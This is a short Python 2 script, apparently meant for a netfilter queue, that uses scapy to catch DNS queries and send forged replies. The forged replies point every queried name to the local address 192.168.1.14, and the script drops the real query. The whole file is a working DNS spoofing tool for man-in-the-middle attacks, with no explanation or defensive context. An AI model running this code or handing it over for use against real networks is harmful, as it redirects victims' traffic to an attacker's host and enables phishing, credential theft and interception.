#!/usr/bin/python2
from scapy.all import *

def callback(packet):
    pkt = IP(packet.get_payload())
    accept = True

    if pkt.haslayer(DNSQR):
        print(pkt.summary())
        spoofed =   IP(src=pkt[IP].dst, dst=pkt[IP].src)/\
                    UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)/\
                    DNS(qd=pkt[DNS].qd, id=pkt[DNS].id, aa=1, qr=1,\
                        an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata='192.168.1.14'))
        send(spoofed)

        accept = False

    if accept:
        packet.accept()
    else:
        packet.drop()
